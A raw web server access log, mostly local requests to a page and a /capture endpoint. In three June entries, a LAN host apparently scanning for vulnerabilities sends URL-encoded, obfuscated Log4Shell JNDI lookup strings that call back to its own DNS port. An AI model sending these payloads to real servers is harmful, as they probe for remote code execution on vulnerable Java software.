2026-05-25T16:42:11.386Z ::1 POST /capture
2026-05-25T16:43:32.488Z ::1 GET /
2026-05-25T16:43:43.929Z ::1 POST /capture
2026-05-25T16:49:19.683Z ::1 POST /capture
2026-05-25T16:52:30.587Z ::1 GET /
2026-05-25T16:52:43.043Z ::1 POST /capture
2026-05-25T16:58:51.866Z ::1 GET /
2026-05-25T16:59:03.342Z ::1 POST /capture
2026-05-25T17:03:21.373Z ::1 GET /
2026-05-25T17:04:24.102Z ::1 GET /
2026-05-25T17:04:27.907Z ::1 GET /
2026-05-25T17:05:24.852Z ::1 GET /
2026-05-25T17:05:27.312Z ::1 GET /
2026-05-25T17:05:49.976Z ::1 POST /capture
2026-05-25T17:06:44.168Z ::1 GET /
2026-05-25T17:06:54.537Z ::1 POST /capture
2026-05-25T17:09:14.131Z ::1 GET /
2026-05-25T17:09:14.376Z ::1 GET /favicon.ico
2026-05-25T17:09:35.551Z ::1 GET /
2026-05-25T17:09:35.771Z ::1 GET /favicon.ico
2026-05-25T17:09:36.939Z ::1 GET /
2026-05-25T17:09:45.712Z ::1 POST /capture
2026-05-25T17:10:35.834Z ::1 GET /
2026-05-25T17:10:36.078Z ::1 GET /favicon.ico
2026-05-25T17:10:47.015Z ::1 POST /capture
2026-05-25T17:12:05.811Z Shutting down server
2026-05-25T17:12:14.906Z ::1 GET /
2026-05-25T17:12:15.285Z ::1 GET /favicon.ico
2026-05-25T17:12:32.729Z ::1 POST /capture
2026-05-25T17:13:32.664Z ::1 POST /capture
2026-05-25T17:14:33.943Z ::1 GET /
2026-05-25T17:14:35.204Z ::1 GET /
2026-05-25T17:14:35.424Z ::1 GET /favicon.ico
2026-05-25T17:14:42.366Z ::1 POST /capture
2026-05-25T17:17:48.368Z ::1 GET /
2026-05-25T17:17:48.611Z ::1 GET /favicon.ico
2026-05-25T17:17:50.605Z ::1 GET /
2026-05-25T17:17:50.827Z ::1 GET /favicon.ico
2026-05-25T17:17:54.308Z ::1 GET /
2026-05-25T17:17:54.525Z ::1 GET /favicon.ico
2026-05-25T17:18:07.044Z ::1 POST /capture
2026-05-25T17:20:09.531Z ::1 GET /
2026-05-25T17:20:10.342Z ::1 GET /
2026-05-25T17:20:10.556Z ::1 GET /favicon.ico
2026-05-25T17:20:26.572Z ::1 POST /capture
2026-05-25T17:21:58.008Z ::1 GET /
2026-05-25T17:21:58.254Z ::1 GET /favicon.ico
2026-05-25T17:22:06.017Z ::1 POST /capture
2026-05-25T17:28:18.139Z ::1 GET /
2026-05-25T17:28:18.486Z ::1 GET /favicon.ico
2026-05-25T17:28:24.759Z ::1 POST /capture
2026-05-25T17:29:27.816Z Shutting down server
2026-05-25T17:29:35.446Z ::1 GET /
2026-05-25T17:29:35.689Z ::1 GET /favicon.ico
2026-05-25T17:29:53.646Z ::1 POST /capture
2026-05-25T17:32:16.154Z ::1 GET /
2026-05-25T17:32:24.351Z ::1 POST /capture
2026-05-25T17:32:57.225Z ::1 GET /
2026-05-25T17:33:07.275Z ::1 POST /capture
2026-05-25T18:48:48.845Z ::1 GET /
2026-05-25T18:49:46.889Z ::1 GET /
2026-05-25T18:51:50.086Z ::1 GET /
2026-05-25T18:51:50.347Z ::1 GET /favicon.ico
2026-05-25T18:52:11.595Z ::1 POST /capture
2026-05-25T18:53:12.723Z Shutting down server
2026-05-25T18:53:28.904Z ::1 GET /
2026-05-25T18:53:43.344Z ::1 POST /capture
2026-05-25T18:54:25.045Z ::1 POST /capture
2026-05-25T18:59:23.437Z ::1 POST /capture
2026-05-25T19:04:59.489Z ::1 GET /
2026-05-25T19:05:30.893Z ::1 POST /capture
2026-05-25T19:05:36.844Z ::1 POST /capture
2026-05-25T19:06:53.804Z Shutting down server
2026-05-25T19:07:02.360Z ::1 GET /
2026-05-25T19:07:16.631Z ::1 POST /capture
2026-05-25T19:23:46.307Z ::1 GET /
2026-05-25T19:40:24.331Z Shutting down server
2026-05-25T19:40:32.075Z ::1 GET /
2026-05-25T19:40:32.443Z ::1 GET /favicon.ico
2026-05-25T19:41:43.030Z ::1 POST /capture
2026-05-26T22:17:07.943Z ::1 GET /
2026-05-26T22:17:08.097Z ::1 GET /favicon.ico
2026-05-26T22:17:19.037Z ::1 GET /
2026-06-08T13:42:46.478Z ::1 GET /
2026-06-08T13:42:54.038Z ::1 GET /
2026-06-08T13:42:55.962Z ::1 GET /favicon.ico
2026-06-08T13:53:03.741Z ::1 POST /capture
2026-06-12T07:34:26.516Z ::ffff:192.168.1.254 OPTIONS rtsp://192.168.1.151/
2026-06-12T07:34:26.532Z ::ffff:192.168.1.254 POST /onvif/device_service
2026-06-12T07:34:32.553Z ::ffff:192.168.1.254 GET /
2026-06-12T07:34:32.625Z ::ffff:192.168.1.254 GET /%24%7B%24%7B%3A%3A-j%7Dn%24%7Blower%3Ad%7Di%24%7Blower%3A%3A%7Dd%24%7Blower%3An%7Ds%3A%2F%2F192.168.1.254%3A49602%2FFlnqdsXZZhFkRLONtGdjdtHPvVhmNUrs%7D
2026-06-12T07:34:42.644Z ::ffff:192.168.1.254 POST /
2026-06-17T18:13:26.467Z ::1 GET /
2026-06-19T07:34:39.581Z ::ffff:192.168.1.254 OPTIONS rtsp://192.168.1.151/
2026-06-19T07:34:39.600Z ::ffff:192.168.1.254 POST /onvif/device_service
2026-06-19T07:34:45.616Z ::ffff:192.168.1.254 GET /
2026-06-19T07:34:45.678Z ::ffff:192.168.1.254 GET /%24%7Bj%24%7Benv%3ATEST%3A-n%7Dd%24%7Benv%3ATEST%3A-i%7D%24%7Benv%3ATEST%3A-%3A%7D%24%7B%3A%3A-d%7Dn%24%7B%3A%3A-s%7D%3A%2F%2F192.168.1.254%3A54441%2FgCxhRsaultgxFZedczyqAsQGLSvDeasb%7D
2026-06-19T07:34:55.762Z ::ffff:192.168.1.254 POST /
2026-06-26T07:34:50.376Z ::ffff:192.168.1.254 OPTIONS rtsp://192.168.1.151/
2026-06-26T07:34:50.394Z ::ffff:192.168.1.254 POST /onvif/device_service
2026-06-26T07:34:56.409Z ::ffff:192.168.1.254 GET /
2026-06-26T07:34:56.454Z ::ffff:192.168.1.254 GET /%24%7Bjnd%24%7Blower%3Ai%7D%3Ad%24%7Blower%3An%7Ds%3A%2F%2F192.168.1.254%3A44369%2FUYoXqXhMkOYruowOuUIqGOJGjCOsyYCt%7D
2026-06-26T07:35:06.465Z ::ffff:192.168.1.254 POST /
2026-06-26T21:43:17.027Z ::1 GET /
2026-06-26T21:43:17.173Z ::1 GET /favicon.ico
2026-06-26T21:44:03.995Z ::1 POST /capture
